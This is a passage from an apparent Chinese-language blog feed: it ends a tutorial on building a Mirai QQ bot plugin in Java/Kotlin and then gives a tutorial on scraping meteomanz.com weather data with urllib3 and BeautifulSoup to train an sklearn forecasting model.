class="string">&quot;EG&quot;</span>)</span><br><span class="line">                .build());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onEnable</span><span class="params">()</span> &#123;</span><br><span class="line">        getLogger().info(<span class="string">&quot;日志&quot;</span>);</span><br><span class="line"></span><br><span class="line">        GlobalEventChannel.INSTANCE.subscribeAlways(GroupMessageEvent.class, g -&gt; &#123;</span><br><span class="line">            <span class="comment">//监听群消息</span></span><br><span class="line">            getLogger().info(g.getMessage().contentToString());</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">        GlobalEventChannel.INSTANCE.subscribeAlways(FriendMessageEvent.class, f -&gt; &#123;</span><br><span class="line">            <span class="comment">//监听好友消息</span></span><br><span class="line">            getLogger().info(f.getMessage().contentToString());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="vi-gradle-部分代码"><a href="#vi-gradle-部分代码" class="headerlink" title="vi. gradle 部分代码"></a>vi. gradle 部分代码</h3><p>同<code>#4-vi.-gradle-部分代码</code></p><h2 id="6-在IDE内运行"><a href="#6-在IDE内运行" class="headerlink" title="6. 在IDE内运行"></a>6. 在IDE内运行</h2><h3 id="i-更改MiraiRunKt配置"><a href="#i-更改MiraiRunKt配置" class="headerlink" title="i. 更改MiraiRunKt配置"></a>i. 更改MiraiRunKt配置</h3><p>把<code>/src/test/kotlin/RunMirai.kt</code>中的qq号和密码改成你的<br>如果在根目录下没有run文件夹，则可能报错，新建一个就好了</p><h3 id="ii-运行MiraiRunKt任务"><a href="#ii-运行MiraiRunKt任务" class="headerlink" title="ii.运行MiraiRunKt任务"></a>ii.运行MiraiRunKt任务</h3><p>如果任务报错先配置任务<br><img src="/images/Mirai-qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%A1%86%E6%9E%B6kotlin_java%E6%95%99%E7%A8%8B.md-1.png" alt="配置任务"><br>然后检查根目录下有没有run文件夹，就是这里的路径，如果没有则创建<br><img src="/images/Mirai-qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%A1%86%E6%9E%B6kotlin_java%E6%95%99%E7%A8%8B.md-2.png" alt="run文件夹"><br>然后配置登录配置<br><img src="/images/Mirai-qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%A1%86%E6%9E%B6kotlin_java%E6%95%99%E7%A8%8B.md-3.png" alt="登录配置"></p><h2 id="7-生成插件并运行"><a href="#7-生成插件并运行" class="headerlink" title="7. 生成插件并运行"></a>7. 生成插件并运行</h2><h3 id="i-生成插件"><a href="#i-生成插件" class="headerlink" title="i. 生成插件"></a>i. 生成插件</h3><p>用IDE中gradle的<code>buldplugin</code>任务可以在<code>buid/mirai/</code>下生成一个.jar插件文件<br><img src="/images/Mirai-qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%A1%86%E6%9E%B6kotlin_java%E6%95%99%E7%A8%8B.md-4.png" alt="buildPlugin"></p><h3 id="ii-在mcl中运行"><a href="#ii-在mcl中运行" class="headerlink" title="ii.在mcl中运行"></a>ii.在mcl中运行</h3><p>把这个.jar文件放到mcl的plugin文件夹下，然后用cmd或者直接打开mcl.cmd运行</p><blockquote><p>有什么评论区问，以后再补充</p></blockquote><center>-END-</center>]]></content>
      
      
      <categories>
          
          <category> Mirai </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用python+sklearn(机器学习)实现天气预测</title>
      <link href="/2020/12/13/%E7%94%A8python-sklearn-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%AE%9E%E7%8E%B0%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5/"/>
      <url>/2020/12/13/%E7%94%A8python-sklearn-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%AE%9E%E7%8E%B0%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/Nambers/PYWeatherReport">github项目:PYWeatherReport</a></p><h2 id="系列教程"><a href="#系列教程" class="headerlink" title="系列教程"></a>系列教程</h2><blockquote><p>本文章为以下几篇的合集<br><a href="https://blog.csdn.net/qq_40832960/article/details/109260388">机器学习参考篇: python+sklearn+kaggle机器学习</a><br><a href="https://blog.csdn.net/qq_40832960/article/details/111146467">用python+sklearn(机器学习)实现天气预报 准备</a><br><a href="https://blog.csdn.net/qq_40832960/article/details/111182425">用python+sklearn(机器学习)实现天气预报数据 数据</a><br> <a href="https://blog.csdn.net/qq_40832960/article/details/111238926">用python+sklearn(机器学习)实现天气预报 模型和使用</a></p></blockquote><h2 id="0-流程介绍"><a href="#0-流程介绍" class="headerlink" title="0.流程介绍"></a>0.流程介绍</h2><p>爬虫爬取<code>去年今日的半个月前到去年今日的下个半个月的每日天气数据</code>做训练集和训练验证集，爬取<code>现在半个月前到现在的每日天气数据</code>做预测数据集 -&gt; 数据预处理 -&gt; 训练模型和预测<br>机器学习过程可参考<a href="https://blog.csdn.net/qq_40832960/article/details/109260388">上面那篇</a></p><h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h2><h2 id="a-python"><a href="#a-python" class="headerlink" title="a.python"></a>a.python</h2><p>如题，要使用python+sklearn做，所以肯定要搭建好python的环境，教程百度有很多，建议用python3.*</p><h3 id="1-1-涉及到的机器学习相关库"><a href="#1-1-涉及到的机器学习相关库" class="headerlink" title="1.1 涉及到的机器学习相关库"></a>1.1 涉及到的机器学习相关库</h3><p>安装命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install 库名</span><br></pre></td></tr></table></figure><h4 id="1-1-1-sklearn"><a href="#1-1-1-sklearn" class="headerlink" title="1.1.1 sklearn"></a>1.1.1 sklearn</h4><p>本教程运用的机器学习核心库</p><h4 id="1-1-2-panda"><a href="#1-1-2-panda" class="headerlink" title="1.1.2 panda"></a>1.1.2 panda</h4><p>读取csv相关</p><h4 id="1-1-3-seaborn"><a href="#1-1-3-seaborn" class="headerlink" title="1.1.3 seaborn"></a>1.1.3 seaborn</h4><p>数据可视化，生成图表如折线图等</p><h4 id="1-1-4-joblib"><a href="#1-1-4-joblib" class="headerlink" title="1.1.4 joblib"></a>1.1.4 joblib</h4><p>保存和读取训练好的模型，<code>*.pkl</code>文件</p><h2 id="2-寻找数据来源"><a href="#2-寻找数据来源" class="headerlink" title="2.寻找数据来源"></a>2.寻找数据来源</h2><p>做机器学习我们需要尽量多和准确的数据，本次实例从<a href="http://www.meteomanz.com/">www.meteomanz.com</a>获取免费的天气数据</p><h2 id="3-分析数据源网址规则"><a href="#3-分析数据源网址规则" class="headerlink" title="3.分析数据源网址规则"></a>3.分析数据源网址规则</h2><p>我们访问上一步的网站，可以发现有选择城市和时间的接口(PS:右上角的链接可以切换成英文)<br><img src="/images/%E7%94%A8python-sklearn-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%AE%9E%E7%8E%B0%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5.md-0.png" alt="网站"><br>接下来我们选择我们要做天气预报的城市和顺便一个时间点，如广州(PS:在选择框直接输入城市的前几个字符可以快速索引)<br><img src="/images/%E7%94%A8python-sklearn-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%AE%9E%E7%8E%B0%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5.md-1.png" alt="网站"><br>然后点按钮，我们会跳转到一个网页<br><img src="/images/%E7%94%A8python-sklearn-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%AE%9E%E7%8E%B0%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5.md-2.png" alt="网页"><br>这个就是我们要取到的数据了的地址，不过时间不对，接下来解析这个网址的规则，如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.meteomanz.com/sy2?l=1&amp;cou=2250&amp;ind=59287&amp;d1=13&amp;m1=12&amp;y1=2020&amp;d2=13&amp;m2=12&amp;y2=2020</span><br></pre></td></tr></table></figure><p>这里面</p><ul><li><code>?</code>前的分别是<code>http://</code>网络协议,<code>www.meteomanz.com</code>域名，<code>/sy2</code>地址，我们主要关注<code>?</code>后的参数</li><li><code>l</code>是语言参数，l&#x3D;1指英语</li><li><code>cou</code>和<code>ind</code>是地区和城市代码</li><li><code>d1</code>，<code>m1</code>，<code>y1</code>是时间段的开始年月日</li><li><code>d2</code>，<code>m2</code>，<code>y2</code>是时间段的结束年月日</li></ul><p>所以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.meteomanz.com/sy2?l=1&amp;cou=2250&amp;ind=59287&amp;d1=02&amp;m1=02&amp;y1=2019&amp;d2=13&amp;m2=12&amp;y2=2020</span><br></pre></td></tr></table></figure><p>指从2019&#x2F;2&#x2F;2到2020&#x2F;12&#x2F;13的广州的每日天气数据，不要忘记里面月和日是要补0的，但是进去就发现最多给30天的数据，所以我们以后并不会用到怎么多天的数据</p><h2 id="4-分析页面规则"><a href="#4-分析页面规则" class="headerlink" title="4.分析页面规则"></a>4.分析页面规则</h2><p>获取到网址规则后，分析页面规则用于爬虫匹配数据，按F12打开开发者工具<br><img src="/images/%E7%94%A8python-sklearn-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%AE%9E%E7%8E%B0%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5.md-3.png" alt="DEV"><br>如图，我们可以发现rbody里面的第二个tr标签里面的每个td里是数据(PS:用右上角的左边第一个小按钮然后点击那些数据)。<br><img src="/images/%E7%94%A8python-sklearn-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%AE%9E%E7%8E%B0%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5.md-4.png" alt="在这里插入图片描述"><br><img src="/images/%E7%94%A8python-sklearn-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%AE%9E%E7%8E%B0%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5.md-5.png" alt="在这里插入图片描述"></p><p>当我们知道了这些规则，接下来就可以写爬虫爬取符合条件的数据集了。</p><h2 id="勘误表"><a href="#勘误表" class="headerlink" title="勘误表"></a>勘误表</h2><ol><li>感谢”Gbilibili”的提醒，下面url代码生成片段<br> 应从 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 爬取数据链接</span></span><br><span class="line">   url = <span class="string">&quot;http://www.meteomanz.com/sy2?l=1&amp;cou=2250&amp;ind=59287&amp;d1=&quot;</span> + </span><br><span class="line">   <span class="built_in">str</span>(week_ago.day).zfill(<span class="number">2</span>) + </span><br><span class="line">   <span class="string">&quot;&amp;m1=&quot;</span> + <span class="built_in">str</span>(week_ago.month).zfill(<span class="number">2</span>) + </span><br><span class="line">   <span class="string">&quot;&amp;y1=&quot;</span> + <span class="built_in">str</span>(week_ago.month) + </span><br><span class="line">   <span class="string">&quot;&amp;d2=&quot;</span> + <span class="built_in">str</span>(week_pre.day - years[<span class="number">0</span>]).zfill(<span class="number">2</span>) + </span><br><span class="line">   <span class="string">&quot;&amp;m2=&quot;</span> + <span class="built_in">str</span>(week_pre.month).zfill(<span class="number">2</span>) + </span><br><span class="line">   <span class="string">&quot;&amp;y2=&quot;</span> + <span class="built_in">str</span>(week_pre.year - years[<span class="number">1</span>])</span><br></pre></td></tr></table></figure> 改成 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># 爬取数据链接</span></span><br><span class="line">url = <span class="string">&quot;http://www.meteomanz.com/sy2?l=1&amp;cou=2250&amp;ind=59287&amp;d1=&quot;</span> + </span><br><span class="line"> <span class="built_in">str</span>(week_ago.day).zfill(<span class="number">2</span>) +</span><br><span class="line"> <span class="string">&quot;&amp;m1=&quot;</span> + <span class="built_in">str</span>( week_ago.month).zfill(<span class="number">2</span>) +</span><br><span class="line"><span class="string">&quot;&amp;y1=&quot;</span> + <span class="built_in">str</span>(week_ago.year - years[<span class="number">0</span>]) +</span><br><span class="line"><span class="string">&quot;&amp;d2=&quot;</span> + <span class="built_in">str</span>(week_pre.day).zfill(<span class="number">2</span>) +</span><br><span class="line"><span class="string">&quot;&amp;m2=&quot;</span> + <span class="built_in">str</span>(week_pre.month).zfill(<span class="number">2</span>) +</span><br><span class="line"> <span class="string">&quot;&amp;y2=&quot;</span> + <span class="built_in">str</span>(week_pre.year - years[<span class="number">1</span>])</span><br></pre></td></tr></table></figure></li><li>感谢@L-Zzxnn的提醒，代码已添加负温度支持，最新代码请以github上为准</li></ol><h2 id="5-爬虫"><a href="#5-爬虫" class="headerlink" title="5.爬虫"></a>5.爬虫</h2><p>爬虫这方面可以参考我之前的<a href="https://blog.csdn.net/qq_40832960/article/details/103854145">一篇文章</a></p><h3 id="5-1确认要被爬取的网页网址"><a href="#5-1确认要被爬取的网页网址" class="headerlink" title="5.1确认要被爬取的网页网址"></a>5.1确认要被爬取的网页网址</h3><p>首先我们主要要爬取去年今日的半个月前到去年今日，而根据上一篇我们得出的网址规则，我们可以得到(PS:真正的链接里是没有换行的)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://www.meteomanz.com/sy2?l=1&amp;cou=2250&amp;ind=59287</span><br><span class="line">&amp;d1=去年今日的半个月前的日</span><br><span class="line">&amp;m1=去年今日的半个月前的月份</span><br><span class="line">&amp;y1=去年年份</span><br><span class="line">&amp;d2=今天的日期的日</span><br><span class="line">&amp;m2=今天的日期的月份</span><br><span class="line">&amp;y2=今年年份</span><br></pre></td></tr></table></figure><p>而为什么是取去年和时间要半个月呢？因为去年的天气环境相比于前年或者更久之前是和我们现在的天气条件更相似的，可以减少误差，半个月而不是一个星期是因为使用多的数据量可以减少误差，不是一个月而是因为网站的限制，而且在实验中也会增加少量的误差。所以最终取用了去年和半个月的时间。</p><p>如果我们是只测今天这一次上面的网址就可以人工填写，但是如果我们要做不用人工填就要用<code>datetime</code>这个python库<br>如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime <span class="keyword">as</span> DT</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取现在日期</span></span><br><span class="line">today = DT.datetime.now()</span><br><span class="line"><span class="comment"># 取b[0]天前日期</span></span><br><span class="line">week_ago = (today - DT.timedelta(days=b[<span class="number">0</span>])).date()</span><br><span class="line"> <span class="comment"># b[1]天后</span></span><br><span class="line"> week_pre = (today + DT.timedelta(days=b[<span class="number">1</span>])).date()</span><br></pre></td></tr></table></figure><p>我们传入<code>b = [-15 0]</code>，就可以获取上个半月的日期在<code>week_ago</code>里，今天的日期在<code>week_pre</code>里<br>所以，可以用这一行构建需要的网址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 爬取数据链接</span></span><br><span class="line">url = <span class="string">&quot;http://www.meteomanz.com/sy2?l=1&amp;cou=2250&amp;ind=59287&amp;d1=&quot;</span> + </span><br><span class="line"> <span class="built_in">str</span>(week_ago.day).zfill(<span class="number">2</span>) +</span><br><span class="line"> <span class="string">&quot;&amp;m1=&quot;</span> + <span class="built_in">str</span>( week_ago.month).zfill(<span class="number">2</span>) +</span><br><span class="line"><span class="string">&quot;&amp;y1=&quot;</span> + <span class="built_in">str</span>(week_ago.year - years[<span class="number">0</span>]) +</span><br><span class="line"><span class="string">&quot;&amp;d2=&quot;</span> + <span class="built_in">str</span>(week_pre.day).zfill(<span class="number">2</span>) +</span><br><span class="line"><span class="string">&quot;&amp;m2=&quot;</span> + <span class="built_in">str</span>(week_pre.month).zfill(<span class="number">2</span>) +</span><br><span class="line"> <span class="string">&quot;&amp;y2=&quot;</span> + <span class="built_in">str</span>(week_pre.year - years[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>其中<code>.zfill(2)</code>是指填充2位，比如如果是1就返回01，如果是12就返回12<br>有了网址，接下来就是爬虫爬取网页然后分析网页元素取出里面的数据</p><h3 id="5-2-爬虫部分"><a href="#5-2-爬虫部分" class="headerlink" title="5.2 爬虫部分"></a>5.2 爬虫部分</h3><p>首先先写爬虫部分，这部分很简单，写了个<code>GetData</code> class</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2020/12/16</span></span><br><span class="line"><span class="comment"># @Author: Eritque arcus</span></span><br><span class="line"><span class="comment"># @File: GetData.py</span></span><br><span class="line"><span class="comment"># 功能: 爬取数据</span></span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GetData</span>:</span><br><span class="line">    url = <span class="string">&quot;&quot;</span></span><br><span class="line">    headers = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url, header=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param url: 获取的网址</span></span><br><span class="line"><span class="string">        :param header: 请求头，默认已内置</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.url = url</span><br><span class="line">        <span class="keyword">if</span> header == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            self.headers = &#123;</span><br><span class="line">                <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,&#x27;</span></span><br><span class="line">                          <span class="string">&#x27;*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, &#x27;</span></span><br><span class="line">                              <span class="string">&#x27;like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36 &#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;www.meteomanz.com&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.headers = header</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :return: 网址对应的网页内容</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        http = urllib3.PoolManager()</span><br><span class="line">        <span class="keyword">return</span> http.request(<span class="string">&#x27;GET&#x27;</span>, self.url, headers=self.headers).data</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>本处用了urllib3库和GET方式，其中headers是申请头，这部分可以在按F12调出开发者工具，在Network那一栏，点击任意一个事件，往下滑就有了，可以用我的也可以。请求头主要是http协议里的东西，想要了解可以自行搜索。</p><h3 id="5-3-网页内容匹配取出部分"><a href="#5-3-网页内容匹配取出部分" class="headerlink" title="5.3 网页内容匹配取出部分"></a>5.3 网页内容匹配取出部分</h3><p>本处使用了<code>BeautifulSoup</code>库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">g = GetData(url).Get()</span><br><span class="line">      <span class="comment"># beautifulsoup解析网页</span></span><br><span class="line">      soup = BeautifulSoup(g, <span class="string">&quot;html5lib&quot;</span>)</span><br><span class="line">      <span class="comment"># 取&lt;tbody&gt;内容</span></span><br><span class="line">      tb = soup.find(name=<span class="string">&quot;tbody&quot;</span>)</span><br><span class="line">      <span class="comment"># 取tr内容</span></span><br><span class="line">      past_tr = tb.find_all(name=<span class="string">&quot;tr&quot;</span>)</span><br><span class="line">      <span class="keyword">for</span> tr <span class="keyword">in</span> past_tr:</span><br><span class="line">          <span class="comment"># 取tr内每个td的内容</span></span><br><span class="line">          text = tr.find_all(name=<span class="string">&quot;td&quot;</span>)</span><br><span class="line">          flag = <span class="literal">False</span></span><br><span class="line">          <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(text)):</span><br><span class="line">              <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                  text[i] = text[i].a.string</span><br><span class="line">                  <span class="comment"># 网站bug，跨月请求的话会给每个月第0天的数据，但是里面是全空的因为日期不存在，比如 00/11/2020(日/月/年),所以要手动drop掉这个数据</span></span><br><span class="line">                  <span class="keyword">if</span> <span class="string">&quot;00/&quot;</span> <span class="keyword">in</span> text[i]:</span><br><span class="line">                      flag = <span class="literal">True</span></span><br><span class="line">              <span class="keyword">elif</span> i == <span class="number">8</span>:</span><br><span class="line">                  <span class="comment"># 把/8去掉，网页显示的格式问题</span></span><br><span class="line">                  text[i] = text[i].string.replace(<span class="string">&quot;/8&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">              <span class="keyword">elif</span> i == <span class="number">5</span>:</span><br><span class="line">                  <span class="comment"># 去掉Hpa单位</span></span><br><span class="line">                  text[i] = text[i].string.replace(<span class="string">&quot; Hpa&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">              <span class="keyword">elif</span> i == <span class="number">6</span>:</span><br><span class="line">                  <span class="comment"># 用正则去掉风力里括号内的内容</span></span><br><span class="line">                  text[i] = re.sub(<span class="string">u&quot;[º(.*?|N|W|E|S)]&quot;</span>, <span class="string">&quot;&quot;</span>, text[i].string)</span><br><span class="line">              <span class="keyword">else</span>:</span><br><span class="line">                  <span class="comment"># 取每个元素的内容</span></span><br><span class="line">                  text[i] = text[i].string</span><br><span class="line">              <span class="comment"># 丢失数据都取2(简陋做法)</span></span><br><span class="line">              <span class="comment"># 这么做 MAE=3.6021</span></span><br><span class="line">              text[i] = text[i].replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">              text[i] = text[i].replace(<span class="string">&quot;Tr&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br></pre></td></tr></table></figure><p>如果有什么不清楚的评论里答复。</p><h3 id="5-4写入csv文件格式化"><a href="#5-4写入csv文件格式化" class="headerlink" title="5.4写入csv文件格式化"></a>5.4写入csv文件格式化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line">   <span class="comment"># 创建文件对象</span></span><br><span class="line">   f = <span class="built_in">open</span>(c, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">   <span class="comment"># 基于文件对象构建 csv写入对象</span></span><br><span class="line">   csv_writer = csv.writer(f)</span><br><span class="line">   <span class="comment"># 写入内容,text数组</span></span><br><span class="line">csv_writer.writerow(text)</span><br><span class="line">   <span class="comment"># 关闭文件</span></span><br><span class="line">   f.close()</span><br></pre></td></tr></table></figure><h3 id="5-6封装成类"><a href="#5-6封装成类" class="headerlink" title="5.6封装成类"></a>5.6封装成类</h3><p><code>Write.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2020/12/16</span></span><br><span class="line"><span class="comment"># @Author: Eritque arcus</span></span><br><span class="line"><span class="comment"># @File: Write.py</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> GetData <span class="keyword">import</span> GetData</span><br><span class="line"><span class="keyword">import</span> datetime <span class="keyword">as</span> DT</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>(<span class="params">t</span>):</span><br><span class="line">    <span class="keyword">return</span> t.replace(<span class="string">&quot; - &quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 功能: 